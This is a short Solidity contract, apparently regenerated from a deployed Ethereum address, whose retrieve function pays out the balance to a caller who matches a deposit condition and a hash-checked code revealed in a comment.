/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract T_TOTAL at 0xd0ecba75e5ef3e08950a4f6608565147ca872ff1
*/
pragma solidity ^0.4.23;

contract T_TOTAL {
    
    function () public payable {}
    function retrieve(string code) public payable {
        if (msg.value >= (this.balance - msg.value)) {
            if (bytes5(keccak256(code)) == 0x70014a63ef) { // cTQjViGRNPaPaWMIwJIsO
                msg.sender.transfer(this.balance);
            }
        }
    }
}